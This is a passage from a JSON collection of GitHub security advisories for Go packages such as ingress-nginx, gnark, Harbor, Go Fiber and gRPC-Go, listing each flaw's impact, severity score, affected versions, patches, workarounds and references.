"url": "https://github.com/kubernetes/kubernetes/commit/7da6d72c05dffb3b87e62e2bc8c3228ea12ba1b9"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/b7547e28f898af37aa2f1107a49111f963250fe6"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/c4e17abb04728e3a3f9bb26e727b0f978df20ec9"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/JrX4bb7d83E"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-01T17:16:38Z", "nvd_published_at": "2023-10-31T21:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-267v-3v32-g6q5", "modified": "2023-10-24T18:32:14Z", "published": "2023-10-17T14:20:59Z", "aliases": ["CVE-2023-45683"], "summary": "Cross-site Scripting via missing Binding syntax validation", "details": "### Impact\n\nThe package does not validate the ACS Location URI according to the SAML binding being parsed.\n\nIf abused, this flaw allows attackers to register malicious Service Providers at the IdP and inject Javascript in the ACS endpoint definition, achieving Cross-Site-Scripting (XSS) in the IdP context during the redirection at the end of a SAML SSO Flow.\n\nConsequently, an attacker may perform any authenticated action as the victim once the victim\u2019s browser loaded the SAML IdP initiated SSO link for the malicious service provider.\n\nNote: The severity is considered \u201cHigh\u201d because the SP registration is commonly an unrestricted operation in IdPs, hence not requiring particular permissions or publicly accessible to ease the IdP interoperability.\n\n### Patches\n\nThis issue is fixed in 0.4.14\n\n### Workarounds\n\nUsers of the package can perform external validation of URLs provided in SAML metadata, or restrict the ability for end-users to upload arbitrary metadata. \n\n### References\n\nThis issue was reported by Francesco Lacerenza from Doyensec.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/crewjam/saml"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.14"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/crewjam/saml/security/advisories/GHSA-267v-3v32-g6q5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45683"}, {"type": "WEB", "url": "https://github.com/crewjam/saml/commit/b07b16cf83c4171d16da4d85608cb827f183cd79"}, {"type": "PACKAGE", "url": "https://github.com/crewjam/saml"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-17T14:20:59Z", "nvd_published_at": "2023-10-16T19:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v9jh-j8px-98vq", "modified": "2023-10-27T23:14:16Z", "published": "2023-10-18T06:30:30Z", "aliases": ["CVE-2023-42319"], "summary": "go-ethereum vulnerable to denial of service via crafted GraphQL query", "details": "Geth (aka go-ethereum) through 1.13.4, when `--http --graphql` is used, allows remote attackers to cause a denial of service (memory consumption and daemon hang) via a crafted GraphQL query.\n\nNOTE: the vendor's position is that the \"graphql endpoint [is not] designed to withstand attacks by hostile clients, nor handle huge amounts of clients/traffic.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.13.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-42319"}, {"type": "WEB", "url": "https://blog.mevsec.com/posts/geth-dos-with-graphql/"}, {"type": "WEB", "url": "https://geth.ethereum.org/docs/fundamentals/security"}, {"type": "PACKAGE", "url": "https://github.com/ethereum/go-ethereum"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-18T18:28:24Z", "nvd_published_at": "2023-10-18T06:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7p92-x423-vwj6", "modified": "2023-10-17T14:24:16Z", "published": "2023-10-17T14:24:16Z", "aliases": [], "summary": "Plonk verifier KZG multi point verification", "details": "### Impact\n\nThe vulnerability allows a third party to derive a valid proof from a valid initial tuple {proof, public_inputs}, corresponding to the same public inputs as the initial proof. It is due to a randomness being generated using a small part of the scratch memory describing the state, allowing for degrees of freedom in the transcript.\n\nNote that the impact is limited to the PlonK verifier smart contract.\n\n### Patches\n\nWe still use a hash function on some data to have a pseudo rng, but instead of hashing the first 32 bytes of the state (\n` let random := mod(keccak256(state, 0x20), r_mod)` )\n\nwe hash the whole state at this point of the verifier as if it was a Fiat Shamir transcript:\n```\n        mstore(mPtr, mload(add(state, STATE_FOLDED_DIGESTS_X)))\n        mstore(add(mPtr, 0x20), mload(add(state, STATE_FOLDED_DIGESTS_Y)))\n        mstore(add(mPtr, 0x40), calldataload(add(aproof, PROOF_BATCH_OPENING_AT_ZETA_X)))\n        mstore(add(mPtr, 0x60), calldataload(add(aproof, PROOF_BATCH_OPENING_AT_ZETA_Y)))\n        mstore(add(mPtr, 0x80), calldataload(add(aproof, PROOF_GRAND_PRODUCT_COMMITMENT_X)))\n        mstore(add(mPtr, 0xa0), calldataload(add(aproof, PROOF_GRAND_PRODUCT_COMMITMENT_Y)))\n        mstore(add(mPtr, 0xc0), calldataload(add(aproof, PROOF_OPENING_AT_ZETA_OMEGA_X)))\n        mstore(add(mPtr, 0xe0), calldataload(add(aproof, PROOF_OPENING_AT_ZETA_OMEGA_Y)))\n        mstore(add(mPtr, 0x100), mload(add(state, STATE_ZETA)))\n        mstore(add(mPtr, 0x120), mload(add(state, STATE_GAMMA_KZG)))\n        let random := staticcall(gas(), 0x2, mPtr, 0x140, mPtr, 0x20)\n```\n\n### Workarounds\n\nIn the function `batch_verify_multi_points`, the variable `random` (corresponding to `u` in the paper, step 12 of the [plonk](https://eprint.iacr.org/2019/953.pdf) verification process) should depend on `state_folded_digests_x`, `state_folded_digests_y`, `proof_grand_product_commitment_x`, `proof_grand_product_commitment_y` and `state_zeta` (by hashing those values for instance).\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/consensys/gnark"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/Consensys/gnark/security/advisories/GHSA-7p92-x423-vwj6"}, {"type": "WEB", "url": "https://github.com/Consensys/gnark/commit/3421eaa7d544286abf3de8c46282b8d4da6d5da0"}, {"type": "PACKAGE", "url": "https://github.com/Consensys/gnark"}], "database_specific": {"cwe_ids": [], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-10-17T14:24:16Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-4frv-5fj6-4p25", "modified": "2023-10-31T22:24:49Z", "published": "2023-10-30T18:30:25Z", "withdrawn": "2023-10-31T22:24:21Z", "aliases": [], "summary": "Duplicate Advisory: NATS.io: Adding accounts for just the system account adds auth bypass", "details": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-fr2g-9hjm-wr23. This link is maintained to preserve external references.\n\n## Original Description\nNATS nats-server before 2.9.23 and 2.10.x before 2.10.2 has an authentication bypass. An implicit $G user in an authorization block can sometimes be used for unauthenticated access, even when the intention of the configuration was for each user to have an account. The earliest affected version is 2.2.0.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.9.23"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.10.0"}, {"fixed": "2.10.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/nats-io/nats-server/security/advisories/GHSA-fr2g-9hjm-wr23"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47090"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2023/10/13/2"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2023/10/30/1"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-31T22:24:21Z", "nvd_published_at": "2023-10-30T17:15:52Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9wmc-rg4h-28wv", "modified": "2023-10-17T12:41:55Z", "published": "2023-10-17T12:41:55Z", "aliases": [], "summary": "github.com/kumahq/kuma affected by CVE-2023-44487", "details": "### Impact\nEnvoy and Go HTTP/2 protocol stack is vulnerable to the \"Rapid Reset\" class of exploits, which send a sequence of HEADERS frames optionally followed by RST_STREAM frames.\n\nThis can be exercised if you use the builtin gateway and receive untrusted http2 traffic.\n\n### Patches\n\nhttps://github.com/kumahq/kuma/pull/8023\nhttps://github.com/kumahq/kuma/pull/8001\nhttps://github.com/kumahq/kuma/pull/8034\n\n### Workarounds\nDisable http2 on the gateway listener with a MeshProxyPatch or ProxyTemplate.\n\n### References\nhttps://github.com/advisories/GHSA-qppj-fm5r-hxr3\nhttps://github.com/golang/go/issues/63417\nhttps://github.com/envoyproxy/envoy/security/advisories/GHSA-jhv4-f7mr-xx76\nhttps://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack\nhttps://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/?sf269548684=1\nhttps://www.envoyproxy.io/docs/envoy/latest/configuration/best_practices/edge", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kumahq/kuma"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.4.0"}, {"fixed": "2.4.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kumahq/kuma"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.3.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kumahq/kuma"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.2.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kumahq/kuma"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.1.0"}, {"fixed": "2.1.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kumahq/kuma"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.8"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-jhv4-f7mr-xx76"}, {"type": "WEB", "url": "https://github.com/kumahq/kuma/security/advisories/GHSA-9wmc-rg4h-28wv"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/63417"}, {"type": "WEB", "url": "https://github.com/kumahq/kuma/pull/8001"}, {"type": "WEB", "url": "https://github.com/kumahq/kuma/pull/8023"}, {"type": "WEB", "url": "https://github.com/kumahq/kuma/pull/8034"}, {"type": "WEB", "url": "https://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-qppj-fm5r-hxr3"}, {"type": "PACKAGE", "url": "https://github.com/kumahq/kuma"}, {"type": "WEB", "url": "https://www.envoyproxy.io/docs/envoy/latest/configuration/best_practices/edge"}, {"type": "WEB", "url": "https://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/?sf269548684=1"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-17T12:41:55Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-75j7-w798-cwwx", "modified": "2023-11-02T17:32:41Z", "published": "2023-10-18T18:21:37Z", "aliases": ["CVE-2023-43802"], "summary": "Arduino Create Agent path traversal - local privilege escalation vulnerability", "details": "### Impact\nThe vulnerability affects the endpoint `/upload` which handles request with the `filename` parameter.\nA user who has the ability to perform HTTP requests to the localhost interface, or is able to bypass the CORS configuration, can escalate his privileges to those of the user running the Arduino Create Agent service via a crafted HTTP POST request.\nFurther details are available in the references.\n\n### Fixed Version\n* `1.3.3`\n\n\n### References\nThe issue was reported by Nozomi Networks Labs. Further details are available at the following URL:\n* https://www.nozominetworks.com/blog/security-flaws-affect-a-component-of-the-arduino-create-cloud-ide\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/arduino/arduino-create-agent"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/arduino/arduino-create-agent/security/advisories/GHSA-75j7-w798-cwwx"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43802"}, {"type": "PACKAGE", "url": "https://github.com/arduino/arduino-create-agent"}, {"type": "WEB", "url": "https://github.com/arduino/arduino-create-agent/releases/tag/1.3.3"}, {"type": "WEB", "url": "https://www.nozominetworks.com/blog/security-flaws-affect-a-component-of-the-arduino-create-cloud-ide"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-35"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-18T18:21:37Z", "nvd_published_at": "2023-10-18T21:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vx74-f528-fxqg", "modified": "2023-10-10T18:23:21Z", "published": "2023-10-10T18:23:21Z", "aliases": [], "summary": "github.com/nghttp2/nghttp2 has HTTP/2 Rapid Reset", "details": "### Impact\n\nRapidly creating and cancelling streams (HEADERS frame immediately followed by RST_STREAM) without bound cause denial of service.\n\nSee https://www.cve.org/CVERecord?id=CVE-2023-44487 for details.\n\n### Patches\n\nnghttp2 v1.57.0 mitigates this vulnerability by default.\n\n### Workarounds\n\nIf upgrading to nghttp2 v1.57.0 is not possible, implement `nghttp2_on_frame_recv_callback`, and check and count RST_STREAM frames.  If excessive number of RST_STREAM are received, then take action, such as dropping connection silently, or call `nghttp2_submit_goaway` and gracefully terminate the connection.\n\n### References\n\nThe following commit mitigates this vulnerability:\n\n- https://github.com/nghttp2/nghttp2/commit/72b4af6143681f528f1d237b21a9a7aee1738832\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nghttp2/nghttp2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.57.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/nghttp2/nghttp2/security/advisories/GHSA-vx74-f528-fxqg"}, {"type": "WEB", "url": "https://github.com/nghttp2/nghttp2/commit/72b4af6143681f528f1d237b21a9a7aee1738832"}, {"type": "PACKAGE", "url": "https://github.com/nghttp2/nghttp2"}, {"type": "WEB", "url": "https://github.com/nghttp2/nghttp2/releases/tag/v1.57.0"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-10T18:23:21Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-mjq6-pv9c-qppq", "modified": "2023-11-02T17:34:21Z", "published": "2023-10-18T17:34:46Z", "aliases": ["CVE-2023-43801"], "summary": "Arduino Create Agent path traversal - arbitrary file deletion vulnerability", "details": "### Impact\nThe vulnerability affects the endpoint `/v2/pkgs/tools/installed` and the way it handles plugin names supplied as user input.\nA user who has the ability to perform HTTP requests to the localhost interface, or is able to bypass the CORS configuration, can delete arbitrary files or folders belonging to the user that runs the Arduino Create Agent via a crafted HTTP DELETE request.\nFurther details are available in the references.\n\n### Fixed Version\n* `1.3.3`\n\n### References\nThe issue was reported by Nozomi Networks Labs. Further details on the issue are available at the following URL:\n* https://www.nozominetworks.com/blog/security-flaws-affect-a-component-of-the-arduino-create-cloud-ide\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/arduino/arduino-create-agent"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/arduino/arduino-create-agent/security/advisories/GHSA-mjq6-pv9c-qppq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43801"}, {"type": "PACKAGE", "url": "https://github.com/arduino/arduino-create-agent"}, {"type": "WEB", "url": "https://github.com/arduino/arduino-create-agent/releases/tag/1.3.3"}, {"type": "WEB", "url": "https://www.nozominetworks.com/blog/security-flaws-affect-a-component-of-the-arduino-create-cloud-ide"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-35"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-18T17:34:46Z", "nvd_published_at": "2023-10-18T22:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mq6f-5xh5-hgcf", "modified": "2023-11-09T16:38:40Z", "published": "2023-10-10T21:29:02Z", "aliases": ["CVE-2023-20902"], "summary": "Harbor timing attack risk", "details": "In the Harbor jobservice container, the comparison of secrets in the authenticator type is prone to timing attacks. The vulnerability occurs due to the following code: https://github.com/goharbor/harbor/blob/aaea068cceb4063ab89313d9785f2b40f35b0d63/src/jobservice/api/authenticator.go#L69-L69\nTo avoid this issue, constant time comparison should be used.\n```\nsubtle.ConstantTimeCompare([]byte(expectedSecret), []byte(secret)) == 0\n```\n\n### Impact\nThis attack might be possible theoretically, but no workable proof of concept is available, and access complexity is set at High.\nThe jobservice exposes these APIs\n```\nCreate a job task --- POST /api/v1/jobs    \nGet job task information --- GET /api/v1/jobs/{job_id}\nStop job task ---  POST /api/v1/jobs/{job_id}\nGet job log task ---  GET /api/v1/jobs/{job_id}/log\nGet job execution --- GET /api/v1/jobs/{job_id}/executions\nGet job stats ---  GET /api/v1/stats\nGet job service configuration ---  GET /api/v1/config\n```\nIt is used to create jobs/stop job tasks and retrieve job task information.  If an attacker obtains the secrets, it is possible to retrieve the job information, create a job, or stop a job task. \n\nThe following versions of Harbor are involved:\n<=Harbor 2.8.2, <=Harbor 2.7.2, <= Harbor 2.6.x, <=Harbor 1.10.17\n\n\n### Patches\nHarbor 2.8.3, Harbor 2.7.3, Harbor 1.10.18\n\n### Workarounds\nBecause the jobservice only exposes HTTP service to harbor-core containers, blocking any inbound traffic from the external network to the jobservice container can reduce the risk.\n\n### Credits\nThanks to Porcupiney Hairs for reporting this issue.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.10.18"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.7.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.8.0"}, {"fixed": "2.8.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories/GHSA-mq6f-5xh5-hgcf"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-20902"}, {"type": "PACKAGE", "url": "https://github.com/goharbor/harbor"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/blob/aaea068cceb4063ab89313d9785f2b40f35b0d63/src/jobservice/api/authenticator.go#L69-L69"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/releases/tag/v1.10.18"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/releases/tag/v2.7.3"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/releases/tag/v2.8.3"}], "database_specific": {"cwe_ids": ["CWE-208", "CWE-362"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-10T21:29:02Z", "nvd_published_at": "2023-11-09T01:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mv73-f69x-444p", "modified": "2023-10-23T21:09:24Z", "published": "2023-10-17T12:41:07Z", "aliases": ["CVE-2023-45141"], "summary": "Go Fiber CSRF Token Validation Vulnerability", "details": "A Cross-Site Request Forgery (CSRF) vulnerability has been identified in the application, which allows an attacker to obtain tokens and forge malicious requests on behalf of a user. This can lead to unauthorized actions being taken on the user's behalf, potentially compromising the security and integrity of the application.\n\n## Vulnerability Details\n\nThe vulnerability is caused by improper validation and enforcement of CSRF tokens within the application. The following issues were identified:\n\n1. **Lack of Token Association**: The CSRF token was validated against tokens in storage but was not tied to the original requestor that generated it, allowing for token reuse.\n\n### Specific Go Packages Affected\ngithub.com/gofiber/fiber/v2/middleware/csrf\n\n## Remediation\n\nTo remediate this vulnerability, it is recommended to take the following actions:\n\n1. **Update the Application**: Upgrade the application to a fixed version with a patch for the vulnerability.\n\n2. **Implement Proper CSRF Protection**: Review the updated documentation and ensure your application's CSRF protection mechanisms follow best practices.\n\n4. **Choose CSRF Protection Method**: Select the appropriate CSRF protection method based on your application's requirements, either the Double Submit Cookie method or the Synchronizer Token Pattern using sessions.\n\n5. **Security Testing**: Conduct a thorough security assessment, including penetration testing, to identify and address any other security vulnerabilities.\n\n## Defence-in-depth\n\nUsers should take additional security measures like captchas or Two-Factor Authentication (2FA) and set Session cookies with SameSite=Lax or SameSite=Secure, and the Secure and HttpOnly attributes.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gofiber/fiber/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.50.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gofiber/fiber/security/advisories/GHSA-mv73-f69x-444p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45141"}, {"type": "WEB", "url": "https://github.com/gofiber/fiber/commit/8c3916dbf4ad2ed427d02c6eb63ae8b2fa8f019a"}, {"type": "WEB", "url": "https://github.com/gofiber/fiber/commit/b50d91d58ecdff2a330bf07950244b6c4caf65b1"}, {"type": "PACKAGE", "url": "https://github.com/gofiber/fiber"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-17T12:41:07Z", "nvd_published_at": "2023-10-16T21:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5wj4-wffq-3378", "modified": "2023-11-03T19:13:55Z", "published": "2023-10-25T21:30:33Z", "aliases": ["CVE-2023-5043"], "summary": "Ingress nginx annotation injection causes arbitrary command execution", "details": "### Issue Details\nA security issue was identified in ingress-nginx where the nginx.ingress.kubernetes.io/configuration-snippet annotation on an Ingress object (in the networking.k8s.io or extensions API group) can be used to inject arbitrary commands, and obtain the credentials of the ingress-nginx controller. In the default configuration, that credential has access to all secrets in the cluster.\n\nThis issue has been rated High (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L), and assigned CVE-2023-5043.\n\n### Affected Components and Configurations\nThis bug affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running kubectl get po -n ingress-nginx.\n\nIf you are running the \u201cchrooted\u201d ingress-nginx controller introduced in v1.2.0 (gcr.io/k8s-staging-ingress-nginx/controller-chroot), command execution is possible but credential extraction is not, so the High severity does not apply.\n\nMulti-tenant environments where non-admin users have permissions to create Ingress objects are most affected by this issue.\n\n#### Affected Versions\n<v1.9.0\n#### Versions allowing mitigation\nv1.9.0\n### Mitigation\nIngress Administrators should set the --enable-annotation-validation flag to enforce restrictions on the contents of ingress-nginx annotation fields.\n\n### Detection\nIf you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io\n\n### Additional Details\nSee ingress-nginx Issue [#10571](https://github.com/kubernetes/ingress-nginx/issues/10571) for more details.\n\n### Acknowledgements\nThis vulnerability was reported by suanve\n\nThank You,\nCJ Cullen on behalf of the Kubernetes Security Response Committee", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/ingress-nginx"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5043"}, {"type": "WEB", "url": "https://github.com/kubernetes/ingress-nginx/issues/10571"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/pVsXsOpxYZo"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2023/10/25/4"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-74"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-03T19:13:55Z", "nvd_published_at": "2023-10-25T20:15:18Z"}}, {"schema_version": "1.4.0", "id": "GHSA-47xw-vw6m-w9fq", "modified": "2023-10-31T21:35:21Z", "published": "2023-10-28T00:30:31Z", "aliases": ["CVE-2023-5834"], "summary": "HashiCorp Vagrant Insecure Operation on Windows Junction / Mount Point vulnerability", "details": "HashiCorp Vagrant's Windows installer targeted a custom location with a non-protected path that could be junctioned, introducing potential for unauthorized file system writes. Fixed in Vagrant 2.4.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vagrant"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.4.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5834"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-31-vagrant-s-windows-installer-allowed-directory-junction-write/59568"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vagrant"}], "database_specific": {"cwe_ids": ["CWE-1386", "CWE-59"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-10-31T21:35:21Z", "nvd_published_at": "2023-10-27T22:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w6rp-vxj2-fjhr", "modified": "2023-10-26T23:10:19Z", "published": "2023-10-26T23:10:19Z", "aliases": [], "summary": "Cosmos packet-forward-middleware vulnerable to chain-halt", "details": "The Cosmos SDK is used for Inter-Blockchain Communication Protocol (IBC) applications and middleware. The [packet-forward-middleware](https://github.com/cosmos/ibc-apps/tree/main/middleware/packet-forward-middleware) module is an IBC middleware module built for Cosmos blockchains utilizing the IBC protocol allowing routing of incoming IBC packets from a source chain to a destination chain. The `packet-forward-middleware` module is vulnerable to potential chain-halt due to error non-determinism.\n\n### Patches\nPlease patch at your earliest convenience by applying one of the following patch versions, respective to the chain's ibc-go major version:\nv4.1.1\nv5.2.1\nv6.1.1", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cosmos/ibc-apps/middleware/packet-forward-middleware/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.1.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cosmos/ibc-apps/middleware/packet-forward-middleware/v5"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.2.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cosmos/ibc-apps/middleware/packet-forward-middleware/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "6.1.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cosmos/ibc-apps/security/advisories/GHSA-w6rp-vxj2-fjhr"}, {"type": "PACKAGE", "url": "https://github.com/cosmos/ibc-apps"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-26T23:10:19Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-m425-mq94-257g", "modified": "2023-10-25T21:17:37Z", "published": "2023-10-25T21:17:37Z", "aliases": [], "summary": "gRPC-Go HTTP/2 Rapid Reset vulnerability", "details": "### Impact\nIn affected releases of gRPC-Go, it is possible for an attacker to send HTTP/2 requests, cancel them, and send subsequent requests, which is valid by the HTTP/2 protocol, but would cause the gRPC-Go server to launch more concurrent method handlers than the configured maximum stream limit.\n\n### Patches\nThis vulnerability was addressed by #6703 and has been included in patch releases: 1.56.3, 1.57.1, 1.58.3.  It is also included in the latest release, 1.59.0.\n\nAlong with applying the patch, users should also ensure they are using the `grpc.MaxConcurrentStreams` server option to apply a limit to the server's resources used for any single connection.\n\n### Workarounds\nNone.\n\n### References\n#6703\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "google.golang.org/grpc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.56.3"}]}]}, {"package": 